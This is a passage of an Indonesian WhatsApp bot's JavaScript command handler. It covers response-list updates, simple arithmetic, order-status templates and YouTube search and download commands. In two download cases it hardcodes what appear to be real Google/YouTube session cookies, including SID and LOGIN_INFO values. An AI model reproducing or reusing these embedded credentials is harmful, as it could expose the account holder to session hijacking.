if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return newReply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
let media = await Aira.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
newReply(`Sukses update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
newReply(`Sukses update respon list dengan key *${args1}*`)
}}
break
case 'tambah':{
if (!text.includes('+')) return newReply(`Gunakan dengan cara ${prefix+command} *angka* + *angka*\n\n_Contoh_\n\n${prefix+command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
newReply(`${nilai_one + nilai_two}`)}
break
case 'kurang':{
if (!text.includes('-')) return newReply(`Gunakan dengan cara ${prefix+command} *angka* - *angka*\n\n_Contoh_\n\n${prefix+command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
newReply(`${nilai_one - nilai_two}`)}
break
case 'kali':{
if (!text.includes('*')) return newReply(`Gunakan dengan cara ${prefix+command} *angka* * *angka*\n\n_Contoh_\n\n${prefix+command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
newReply(`${nilai_one * nilai_two}`)}
break
case 'bagi':{
if (!text.includes('/')) return newReply(`Gunakan dengan cara ${prefix+command} *angka* / *angka*\n\n_Contoh_\n\n${prefix+command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
newReply(`${nilai_one / nilai_two}`)}
break
case 'setproses': case 'setp':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) return newReply(`Set proses already active`)
addSetProses(text, m.chat, set_proses)
newReply(`✅ Done set proses!`)
break
case 'changeproses': case 'changep':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) {
changeSetProses(text, m.chat, set_proses)
newReply(`Sukses ubah set proses!`)
} else {
addSetProses(text, m.chat, set_proses)
newReply(`Sukses ubah set proses!`)
}
break
case 'delsetproses': case 'delsetp':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isSetProses(m.chat, set_proses)) return newReply(`Belum ada set proses di gc ini`)
removeSetProses(m.chat, set_proses)
newReply(`Sukses delete set proses`)
break
case 'setdone':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) return newReply(`Udh set done sebelumnya`)
addSetDone(text, m.chat, set_done)
newReply(`Sukses set done!`)
break
}
case 'changedone': case 'changed':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) {
changeSetDone(text, m.chat, set_done)
newReply(`Sukses ubah set done!`)
} else {
addSetDone(text, m.chat, set_done)
newReply(`Sukses ubah set done!`)
}}
break
case 'delsetdone': case 'delsetd':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isSetDone(m.chat, set_done)) return newReply(`Belum ada set done di gc ini`)
removeSetDone(m.chat, set_done)
newReply(`Sukses delete set done`)}
break

// Downloads Menu
/*case 'play': case 'ytplay':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Example : ${prefix + command} Lagu sad`)
const youtube = require("yt-search");
try {
var search = await youtube(text);
var convert = search.videos[0];
if (!convert) throw 'Video/Audio Tidak Ditemukan';
if (convert.seconds >= 3600) {
return newReply('Video is longer than 1 hour!') 
} else {
var audioUrl
try {
audioUrl = `https://widipe.com/youtube?url=${convert.url}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`
} catch (e) {
audioUrl = `https://widipe.com/youtube?url=${convert.url}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`} 
var caption = `∘ Title : ${convert.title}\n∘ Ext : Search\n∘ ID : ${convert.videoId}\n∘ Duration : ${convert.timestamp}\n∘ Viewers : ${convert.views}\n∘ Upload At : ${convert.ago}\n∘ Author : ${convert.author.name}\n∘ Channel : ${convert.author.url}\n∘ Url : ${convert.url}\n∘ Description : ${convert.description}\n∘ Thumbnail : ${convert.image}`;
var pesan = Aira.relayMessage(m.chat, {
extendedTextMessage:{
text: caption, 
contextInfo: {
externalAdReply: {
title: "Powered by",
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: convert.image,
sourceUrl: audioUrl
}
}, mentions: [m.sender]
}}, {})
Aira.sendMessage(m.chat, {
audio: {
url: audioUrl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: convert.title,
body: "",
thumbnailUrl: convert.image,
sourceUrl: audioUrl,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
});
}
} catch (e) {
newReply(`*Error*`);
}
}
break
case 'ytmp3': case 'ytaudio': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Example : ${prefix + command} Lagu sad`)
const youtube = require("yt-search");
try {
var search = await youtube(text);
var convert = search.videos[0];
if (!convert) throw 'Video/Audio Tidak Ditemukan';
if (convert.seconds >= 3600) {
return newReply('Video is longer than 1 hour!') 
} else {
var audioUrl
try {
audioUrl = `https://widipe.com/youtube?url=${convert.url}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`
} catch (e) {
audioUrl = `https://widipe.com/youtube?url=${convert.url}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`} 
var caption = `∘ Title : ${convert.title}\n∘ Ext : Search\n∘ ID : ${convert.videoId}\n∘ Duration : ${convert.timestamp}\n∘ Viewers : ${convert.views}\n∘ Upload At : ${convert.ago}\n∘ Author : ${convert.author.name}\n∘ Channel : ${convert.author.url}\n∘ Url : ${convert.url}\n∘ Description : ${convert.description}\n∘ Thumbnail : ${convert.image}`;
var pesan = Aira.relayMessage(m.chat, {
extendedTextMessage:{
text: caption, 
contextInfo: {
externalAdReply: {
title: "Powered by",
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: convert.image,
sourceUrl: audioUrl
}
}, mentions: [m.sender]
}}, {})
Aira.sendMessage(m.chat, {
audio: {
url: audioUrl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: convert.title,
body: "",
thumbnailUrl: convert.image,
sourceUrl: audioUrl,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
});
}
} catch (e) {
newReply(`*Error*`);
}
}
break*/

case 'play': case 'ytplay':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Example : ${prefix + command} Lagu sad`)
let search = await yts(`${text}`)
let caption = `*YOUTUBE PLAY*

あ ID : ${search.all[0].videoId}
あ Title : ${search.all[0].title}
あ Views : ${search.all[0].views}
あ Duration : ${search.all[0].timestamp}
あ Channel : ${search.all[0].author.name}
あ Upload : ${search.all[0].ago}
あ URL Video : ${search.videos[0].url}
あ Description : ${search.videos[0].description}

_Please Wait The Audio File Is Being Send..._`
let todd = await getBuffer(search.all[0].image)
const ytdl = require('ytdl-core')
const cookiess = [
  { name: "GPS", value: "1" },
  { name: "YSC", value: "j6AMUoLuAhI" },
  { name: "VISITOR_INFO1_LIVE", value: "VYxScBxG8QY" },
  { name: "VISITOR_PRIVACY_METADATA", value: "CgJJRBIEGgAgLw%3D%3D" },
  { name: "PREF", value: "tz=Asia.Jakarta" },
  { name: "__Secure-1PSIDTS", value: "sidts-CjIB4E2dkcOaYd46wxQ9KKfE0JzIIuViUCM2QggynfdN0pDrBiG7j-oOdzYsMjr-TDRxahAA" },
  { name: "__Secure-3PSIDTS", value: "sidts-CjIB4E2dkcOaYd46wxQ9KKfE0JzIIuViUCM2QggynfdN0pDrBiG7j-oOdzYsMjr-TDRxahAA" },
  { name: "HSID", value: "AEP_LFb68m3U6-fdU" },
  { name: "SSID", value: "A6kAlf4pT-v8akZZU" },
  { name: "APISID", value: "20dOWkLjpfVUdXqy/ALXS-G0TPvd0cir3P" },
  { name: "SAPISID", value: "GMS7jo_i4Ol0SDnm/AtR11kiFtHpUZ32Q-" },
  { name: "__Secure-1PAPISID", value: "GMS7jo_i4Ol0SDnm/AtR11kiFtHpUZ32Q-" },
  { name: "__Secure-3PAPISID", value: "GMS7jo_i4Ol0SDnm/AtR11kiFtHpUZ32Q-" },
  { name: "LOGIN_INFO", value: "AFmmF2swRgIhALhTy3WECkXtKbtxAztGjIxwAF_Ew-N22osNc-cgLx5iAiEAtqYQ5WasaVQhJwod8pyuCTEHnk-uQ-70cksdK_al1u0:QUQ3MjNmeF95UDlIZC1uZjl5ZHJIX2dzY2E0Vndoak8xbnpmVWp2YnhKNFZqa1VseEYzck5fZVRyYW54ZjR1anNUUEd0VERyUXVDXzN6M2VSRDcwbmpkdVFyZDZwNi1uRzUzcERfMGNnSE1OYnVfZ09PY0dKMXNtNmE4NUZWZE1uQkM4ejhGSDU1cHE2RjBtbnpnLW10U0VhcnRmcnFJRnF3" },
  { name: "YTSESSION-jnufdw", value: "ANPz9KjFjycAmOsIpBNsCoYaFnBpLpgRjsaELUklP4KHDMbb3pZrV/GFT3QlmdtQl5c/5b52EOWRcUKKazbAv65TMazcYNuwTsKF3uY=" },
  { name: "SID", value: "g.a000mAjFFMaVyfQsXpNM547GAEN1jP2wmgwVm1LVcinDsZXu1pYq4W3yOtFOPfOzMz3b-dwVQAACgYKAWESARYSFQHGX2Mi0t41u-16mQGpxA4BJHOiWRoVAUF8yKrVKIkNTEW2lYBJ5gOqMqM30076" },
  { name: "__Secure-1PSID", value: "g.a000mAjFFMaVyfQsXpNM547GAEN1jP2wmgwVm1LVcinDsZXu1pYqVqa0V1UgY7qtOI2NZOqU8QACgYKAfISARYSFQHGX2MilibnR4Vo479T1nBULylaFBoVAUF8yKrD9y5hxiF38dQ1rnLrIpRc0076" },
  { name: "__Secure-3PSID", value: "g.a000mAjFFMaVyfQsXpNM547GAEN1jP2wmgwVm1LVcinDsZXu1pYqNSdqRgskQKEzRsDXX5uI3wACgYKAUYSARYSFQHGX2MiTkAE_L5ddi5YkHq5HENQPxoVAUF8yKr6vkPcQIv2UJD5WMFFi0tI0076" },
  { name: "SIDCC", value: "AKEyXzUYxsQajmiu71Fs6KbBgxdSW6rsZvAma77-fDgNgs2bJfHQ4EXYugZlgmdrtaH4yk7l" },
  { name: "__Secure-1PSIDCC", value: "AKEyXzWPOa-Y54RCPOgkpEIcJ2GmxDHHccRWXFBhkNw5a1k0K-Wym-FSw29Jmu--UpyaF9lF" },
  { name: "__Secure-3PSIDCC", value: "AKEyXzUpZGaTEgfXWjNGYIyR5z0Z_8-nbYG536X4KdkoTySDGpsV8XoC96bIeoY6PPxaKNfX" }
];

const agentOptions = {
  pipelining: 5,
  maxRedirections: 0,
  //localAddress: "127.0.0.1"
};

// agent should be created once if you don't want to change your cookie
const agent = ytdl.createAgent(cookiess, agentOptions);

let ply = search.videos[0].url
let mp4file = `./${m.chat}.mp4`
//const ytdl = require('ytdl-core')
let nana2 = await ytdl(ply,{agent}, { filter: 'videoandaudio' })
  .pipe(fs.createWriteStream(mp4file))
  .on('finish', async () => {
 Aira.sendMessage(m.chat, {video: fs.readFileSync(mp4file), mimetype:'video/mp4' , caption: caption}, {quoted: m})
   })
//Aira.sendMessage(m.chat, {image: todd, caption: caption}, {quoted:m})
 let mp3file = `./${m.chat}.mp3`
  let nana = ytdl(ply, {agent},{ filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
await delay (1500) 
Aira.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype:'audio/mpeg', ptt:true }, {quoted: m})
   })
}
limitAdd(m.sender, limit)
break
case 'yttranscript': case 'ringkasyt': case 'summarize': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!text.startsWith('https://youtube.com')&&!text.startsWith('https://youtu.be')) return newReply(mess.error.Iv)
let result = await rapid.transcript(text)
console.log(result.body)
let urlnya = result.body.split('URL: ')
let buffernya = await getBuffer(urlnya)
let pathnya = await savefrombuffer(buffernya,'.txt')
let isinya = fs.readFileSync(pathnya).toString()
newReply(isinya)
await Aira.sendMessage(m.chat, { document: buffernya, fileName: 'ringkasan.txt', mimetype: '.txt' }, { quoted: m })

}
limitAdd(m.sender, limit)
break
case 'ytmp3': case 'ytaudio': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!text.startsWith('https://youtube.com')&&!text.startsWith('https://youtu.be')) return newReply(mess.error.Iv)
function getYouTubeVideoId(url) {
  let videoId = '';
  const urlParams = new URLSearchParams(new URL(url).search);

  if (url.includes('youtu.be')) {
    videoId = url.split('youtu.be/')[1].split('?')[0];
  } else if (url.includes('youtube.com') && urlParams.has('v')) {
    videoId = urlParams.get('v');
  } else if (url.includes('youtube.com') && url.includes('?si')) {
    videoId = url.split('/')[3].split('?')[0];
  }

  return videoId;
}
let vidid = await getYouTubeVideoId(text)
let search = await yts({videoId: vidid})
console.log(search)
let caption = `*YOUTUBE PLAY*
あ ID : ${vidid}
あ Title : ${search.title}
あ Views : ${search.views}
あ Duration : ${search.timestamp}
あ Channel : ${search.author.name}
あ Upload : ${search.ago}
あ URL Video : ${search.url}
あ Description : ${search.description}

_Please wait, the audio file is being sent..._`
let todd = await getBuffer(search.image)
Aira.sendMessage(m.chat, {image: todd, caption: caption}, {quoted:m})
let ply = vidid;
const ytdl = require('ytdl-core')
const cookiess = [
  { name: "GPS", value: "1" },
  { name: "YSC", value: "j6AMUoLuAhI" },
  { name: "VISITOR_INFO1_LIVE", value: "VYxScBxG8QY" },
  { name: "VISITOR_PRIVACY_METADATA", value: "CgJJRBIEGgAgLw%3D%3D" },
  { name: "PREF", value: "tz=Asia.Jakarta" },
  { name: "__Secure-1PSIDTS", value: "sidts-CjIB4E2dkcOaYd46wxQ9KKfE0JzIIuViUCM2QggynfdN0pDrBiG7j-oOdzYsMjr-TDRxahAA" },
  { name: "__Secure-3PSIDTS", value: "sidts-CjIB4E2dkcOaYd46wxQ9KKfE0JzIIuViUCM2QggynfdN0pDrBiG7j-oOdzYsMjr-TDRxahAA" },
  { name: "HSID", value: "AEP_LFb68m3U6-fdU" },
  { name: "SSID", value: "A6kAlf4pT-v8akZZU" },
  { name: "APISID", value: "20dOWkLjpfVUdXqy/ALXS-G0TPvd0cir3P" },
  { name: "SAPISID", value: "GMS7jo_i4Ol0SDnm/AtR11kiFtHpUZ32Q-" },
  { name: "__Secure-1PAPISID", value: "GMS7jo_i4Ol0SDnm/AtR11kiFtHpUZ32Q-" },
  { name: "__Secure-3PAPISID", value: "GMS7jo_i4Ol0SDnm/AtR11kiFtHpUZ32Q-" },
  { name: "LOGIN_INFO", value: "AFmmF2swRgIhALhTy3WECkXtKbtxAztGjIxwAF_Ew-N22osNc-cgLx5iAiEAtqYQ5WasaVQhJwod8pyuCTEHnk-uQ-70cksdK_al1u0:QUQ3MjNmeF95UDlIZC1uZjl5ZHJIX2dzY2E0Vndoak8xbnpmVWp2YnhKNFZqa1VseEYzck5fZVRyYW54ZjR1anNUUEd0VERyUXVDXzN6M2VSRDcwbmpkdVFyZDZwNi1uRzUzcERfMGNnSE1OYnVfZ09PY0dKMXNtNmE4NUZWZE1uQkM4ejhGSDU1cHE2RjBtbnpnLW10U0VhcnRmcnFJRnF3" },
  { name: "YTSESSION-jnufdw", value: "ANPz9KjFjycAmOsIpBNsCoYaFnBpLpgRjsaELUklP4KHDMbb3pZrV/GFT3QlmdtQl5c/5b52EOWRcUKKazbAv65TMazcYNuwTsKF3uY=" },
  { name: "SID", value: "g.a000mAjFFMaVyfQsXpNM547GAEN1jP2wmgwVm1LVcinDsZXu1pYq4W3yOtFOPfOzMz3b-dwVQAACgYKAWESARYSFQHGX2Mi0t41u-16mQGpxA4BJHOiWRoVAUF8yKrVKIkNTEW2lYBJ5gOqMqM30076" },
  { name: "__Secure-1PSID", value: "g.a000mAjFFMaVyfQsXpNM547GAEN1jP2wmgwVm1LVcinDsZXu1pYqVqa0V1UgY7qtOI2NZOqU8QACgYKAfISARYSFQHGX2MilibnR4Vo479T1nBULylaFBoVAUF8yKrD9y5hxiF38dQ1rnLrIpRc0076" },
  { name: "__Secure-3PSID", value: "g.a000mAjFFMaVyfQsXpNM547GAEN1jP2wmgwVm1LVcinDsZXu1pYqNSdqRgskQKEzRsDXX5uI3wACgYKAUYSARYSFQHGX2MiTkAE_L5ddi5YkHq5HENQPxoVAUF8yKr6vkPcQIv2UJD5WMFFi0tI0076" },
  { name: "SIDCC", value: "AKEyXzUYxsQajmiu71Fs6KbBgxdSW6rsZvAma77-fDgNgs2bJfHQ4EXYugZlgmdrtaH4yk7l" },
  { name: "__Secure-1PSIDCC", value: "AKEyXzWPOa-Y54RCPOgkpEIcJ2GmxDHHccRWXFBhkNw5a1k0K-Wym-FSw29Jmu--UpyaF9lF" },
  { name: "__Secure-3PSIDCC", value: "AKEyXzUpZGaTEgfXWjNGYIyR5z0Z_8-nbYG536X4KdkoTySDGpsV8XoC96bIeoY6PPxaKNfX" }
];

const agentOptions = {
  pipelining: 5,
  maxRedirections: 0,
  //localAddress: "127.0.0.1"
};

// agent should be created once if you don't want to change your cookie
const agent = ytdl.createAgent(cookiess, agentOptions);



let mp3file = `./${m.chat}.mp3`
  let nana = ytdl(ply,{agent}, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
Aira.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype:'audio/mpeg', ptt:true }, {quoted: m})
Aira.sendMessage(m.chat, { document: fs.readFileSync(mp3file), fileName: search.title+'.mp3', mimetype: 'audio/mp3' }, { quoted: m })
   })
}
limitAdd(m.sender, limit)
break
case 'ytmp32': case 'ytaudio2': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://youtu.be/dhYOPzcsbGM`)
if (!text.includes('youtu.be') && !text.includes('youtube.com')) return newReply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://youtu.be/dhYOPzcsbGM`)
await newReply(mess.wait)
let search = await yts(`${text}`)
let caption = `*YOUTUBE PLAY*

あ ID : ${search.all[0].videoId}
あ Title : ${search.all[0].title}
あ Views : ${search.all[0].views}
あ Duration : ${search.all[0].timestamp}
あ Channel : ${search.all[0].author.name}
あ Upload : ${search.all[0].ago}
あ URL Video : ${search.videos[0].url}
あ Description : ${search.videos[0].description}

_Please wait, the audio file is being sent..._`
let todd = await getBuffer(search.all[0].image)
Aira.sendMessage(m.chat, {image: todd, caption: caption}, {quoted:m})
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./${m.chat}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
Aira.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype:'audio/mpeg', ptt:true }, {quoted: m})
Aira.sendMessage(m.chat, { document: fs.readFileSync(mp3file), fileName: search.all[0].title, mimetype: 'audio/mp3' }, { quoted: m })
   })
}
limitAdd(m.sender, limit)
break
case 'ytv3': case 'ytvideo3': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://api.ouzen.xyz/downloader/youtube?apikey=${setting.ZenzKey}&url=${text}`)
const cpt = anu.result.duration
const nick = anu.result.title
Aira.sendMessage(m.chat, { video: { url: anu.result.getVideo.url}, caption: `💬Judul : ${nick}\n⏱️Durasi : ${cpt}\n\n*NOTE* : Jika video tidak dapat diputar, ketik .ytv *url*`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download\n\nPlease try typing .ytv *url*`);
}
limitAdd(m.sender, limit)
}
break
case 'ytmp43': case 'ytvideo3': {
  let { ytv } = require('./lib/y2mate')
  if (!text) return `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  newReply(mess.wait)
  let quality = args[1] ? args[1] : '360p'
  let media = await ytv(text, quality)
  if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
  Aira.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `• Title : ${media.title}\n• File Size : ${media.filesizeF}\n• Url : ${isUrl(text)}\n• Ext : MP3\n• Resolusi : ${args[1] || '360p'}` }, { quoted: m })
}
limitAdd(m.sender, limit)
break

case 'ytmp4': case 'ytv': case 'ytvideo': case 'ythd':{
if (!text) return `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!text.startsWith('https://youtube.com')&&!text.startsWith('https://youtu.be')) return newReply(mess.error.Iv)
function getYouTubeVideoId(url) {
  let videoId = '';
  const urlParams = new URLSearchParams(new URL(url).search);

  if (url.includes('youtu.be')) {
    videoId = url.split('youtu.be/')[1].split('?')[0];
  } else if (url.includes('youtube.com') && urlParams.has('v')) {
    videoId = urlParams.get('v');
  } else if (url.includes('youtube.com') && url.includes('?si') && !url.includes('shorts')) {
    videoId = url.split('/')[3].split('?')[0];
  } else if (url.includes('shorts') && url.includes('?si')) {
    videoId = url.split('/')[4].split('?')[0];
 
  }
 console.log(videoId)
  return videoId;
}
newReply(mess.wait)
let vidid = await getYouTubeVideoId(text)
//let yturl = text.split('/')[3]
//let yturl2 = yturl.split('?')[0]
console.log(vidid)
let response = await rapid.ytmp(vidid)
let vidnya = response.formats[response.formats.length-1]
let cap = `
🏷️ *TITLE:* ${response.title}
👀 *VIEWS:* ${response.viewCount}
🌟 *Quality:* ${vidnya.qualityLabel}
🎞️ *Fps:* ${vidnya.fps}
📺 *Channel:* ${response.channelTitle}
📝 *Description:* ${response.description}
`
Aira.sendMessage(m.chat, { video: { url:  vidnya.url}, caption: cap}, {quoted: m})
limitAdd(m.sender, limit)
}
break
/*case 'ytvideo': case 'ytmp4': {
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  if (!text) return `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
  let quality = args[1] ? args[1] : '360p'
  newReply(mess.wait)
  const ytdl = require('youtubedl-core');
  const ytsr = require('ytsr');
  const ytIdRegex = /(?:youtube\.com\/\S*(?:(?:\/e(?:mbed))?\/|watch\?(?:\S*?&?v\=))|youtu\.be\/)([a-zA-Z0-9_-]{6,11})/
  const isYTUrl = (url) => {
    return ytIdRegex.test(url)
  }
  const getVideoID = (url) => {
    if (!isYTUrl(url)) throw new Error('is not YouTube URL')
    return ytIdRegex.exec(url)[1]
  }
  const videoId = isYTUrl(text) ? getVideoID(text) : text
  
  let videoInfo;
  try {
    videoInfo = await ytdl.getInfo(text, { lang: 'id' });
  } catch (error) {
    console.error(error)
    return newReply('Gagal mendapatkan informasi video')
  }

  let formats = videoInfo.formats.filter(format => format.hasVideo && format.hasAudio);
  let chosenFormat = formats.find(format => format.qualityLabel === quality);
  
  if (!chosenFormat) {
    return newReply('Tidak ada format video dengan resolusi yang diminta')
  }

  const ytc = `
  *あ Tittle:* ${videoInfo.videoDetails.title}
  *あ Date:* ${videoInfo.videoDetails.publishDate}
  *あ Duration:* ${videoInfo.videoDetails.lengthSeconds}
  *あ Quality:* ${chosenFormat.qualityLabel}
  *あ Description:*\n ${videoInfo.videoDetails.description}`

  await Aira.sendMessage(m.chat, {
    video: { url: chosenFormat.url },
    caption: ytc
  }, { quoted: m })
}
limitAdd(m.sender, limit)
break;*/

case 'ytvideo4': case 'ytmp44': {
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  if (!text) return `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
  let quality = args[1] ? args[1] : '1080p'
  newReply(mess.wait)
  const ytdl = require('youtubedl-core');
  const ytIdRegex = /(?:youtube\.com\/\S*(?:(?:\/e(?:mbed))?\/|watch\?(?:\S*?&?v\=))|youtu\.be\/)([a-zA-Z0-9_-]{6,11})/
  //if (!query) throw new Error('Video ID or YouTube Url is required')
  //if (!quality) throw new Error('resolusi ID or YouTube Url is required')
  const isYTUrl = (url) => {
    return ytIdRegex.test(url)}
  const getVideoID = (url) => {
      if (!isYTUrl(url)) throw new Error('is not YouTube URL')
      return ytIdRegex.exec(url)[1]
  }
  const videoId = isYTUrl(text) ? getVideoID(text) : text
  const videoInfo = await ytdl.getInfo(text, { lang: 'id' });
  const format = ytdl.chooseFormat(videoInfo.formats, { format: quality, filter: 'videoandaudio' })
  //const vid=await YT (text,quality)
  const ytc=`
  *あ Tittle:* ${videoInfo.videoDetails.title}
  *あ Date:* ${videoInfo.videoDetails.publishDate}
  *あ Duration:* ${videoInfo.videoDetails.lengthSeconds}
  *あ Quality:* ${format.qualityLabel}
  *あ Description:\n* ${videoInfo.videoDetails.description}`
  await Aira.sendMessage(m.chat,{
      video: {url:format.url},
      caption: ytc
  },{quoted:m})
  }
limitAdd(m.sender, limit)
break
case 'ytv2': case 'ytmp42': case 'ytvideo2': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://api.anna.biz.id/api/download/ytmp4?url=${text}`)
const cpt = anu.result.published
const nick = anu.result.title
Aira.sendMessage(m.chat, { video: { url: anu.result.url}, caption: `💬Judul : ${nick}\n📆Tanggal Upload : ${cpt}`}, {quoted: m})
}catch (error) {
newReply('Error') 
}
}
limitAdd(m.sender, limit)
break
case 'lk21':{
  return newReply(`Fitur Sedang Error`)
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!text) return newReply (`Nyari Apa?`) 
newReply (mess.wait) 
let res = await fetch(`https://wibu-api.eu.org/api/lk21/search?title=${text}`)
 try {
let json = await res.json()
json = json.result.map((v) => `*Judul:* ${v.judul}\n*Link:* ${v.link}\n*Kategori:* ${v.kategori}\n*Download:* ${v.dl}\n`).join`\n\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n\n`
newReply(json)
} catch (e) {
newReply(`Tidak Dapat Menemukan Apa Yang Kamu Cari`)
}
}
break
case 'jarak':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} jakarta|bandung`)
newReply(mess.wait)
let [from, to] = text.split(/[^\w\s]/g)
